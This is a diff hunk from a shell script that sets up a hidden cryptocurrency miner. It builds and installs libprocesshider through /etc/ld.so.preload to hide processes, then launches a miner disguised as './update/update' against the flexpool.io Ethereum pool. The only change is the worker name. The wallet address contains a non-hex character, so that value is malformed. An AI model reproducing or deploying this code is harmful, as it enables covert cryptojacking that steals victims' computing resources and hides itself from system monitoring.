@@ -41,4 +41,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-./update/update ./bezzHash --url=ssl://0x7a8f069g453654345612345dbF742b2c8.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))@eth-sg.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./update/update ./Comedy --url=ssl://0x7a8f069g453654345612345dbF742b2c8.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))@eth-sg.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
